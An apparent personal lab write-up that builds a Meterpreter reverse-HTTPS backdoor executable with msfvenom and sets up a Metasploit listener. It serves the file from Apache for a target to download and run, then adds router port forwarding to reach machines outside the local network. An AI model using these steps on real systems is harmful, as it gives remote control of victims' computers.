# Client Side Protection  

## Objective

Finding backdoors and payloads in the client side for protection

### Skills Learned

- Installing Metasploitable on a Mac (silicon)

  

### Tools Used

- Metasploitable
- Zenmap
- metasploit
- Msfvenom
  

### Steps for Client side vulnerabilities (Msfvenom)

- We can check all the payloads that msfvenom has
```bash
msfvenom --list payloads
```
- We can see the list of the payloads, the first part is the name, the second part is the description. (Platform/type/communication) thats the naming of the payloads. The communication is broken into direction and protocol.
- We can now check a payload and check its options
  
```bash
msfvenom --payload windows/meterpreter/reverse_https --list-options
```

- We can change the basic options, LHOST is our computer and LPORT is the port we want to listen on. We can change the values and choose a file format and name for the payload we want to create.
  
```bash
msfvenom --payload windows/meterpreter/reverse_https LHOST=192.168.233.134 LPORT=8080 --format exe --out reverse_https_8080.exe
```

- Now we will test the backdoor, we need to turn on Metasploit **msfconsole**.
- We then use the module to open a port on our computer.
```bash
use exploit/multi/handler
```

- We can change the payload to our own payload and the module options should change
```bash
set PAYLOAD windows/meterpreter/reverse_https
```
- We change the LHOST and LPORT to match the payload we made.
- We then start the module with **Exploit**

### Steps to deliver the payload to a target 

- We to go the default path of web server for Kali linux, var/www/html.
- We can create a folder (directory) and put the payload file we made.
- We start the web server from Kali
```bash
service apache2 start
```
- We can open the web server at the target machine by typing the IP address of the Kali in the target's browser.
- We can navigate to our directory. IP-address/name-of-div
- We then dowmload the file and install it ( need to download Avast to get the file to not be deleted and run as Admin)
- The promt of Kali will be **meterpreter>** which means our backdoor is installed. We can type **sysinfo** to find the OS of the target machine.


### Gaining access from Outside the local network using our router

- We can find router's IP address is by typing route -n. OR on the Mac in the wifi settings
- We login the routers settings from our computer and find the advance settings and port or IP forwading.
- We create the backdoor but the LHOST is our public IP
```bash
msfvenom --payload windows/meterpreter/reverse_https LHOST=72.212.179.202 LPORT=8080 --format exe --out reverse_https_8080_publicIP.exe
```
- We use msfconsole and use the payload exploit/multi/handler and change the options to our router options
<img width="909" alt="image" src="https://github.com/user-attachments/assets/5075ea90-5b1f-4a4b-92cc-b0c92f9d41a0" />

- We then exploit and now we are listenting to our private IP via port 8080.
- We now Configure the router to forward connection using the IP forwarding settings in the router.
![IMG_50479B949321-1](https://github.com/user-attachments/assets/c227e6ed-13c2-4b49-ad78-f19200afbebc)

- We create another rule for port 80 as well
- 














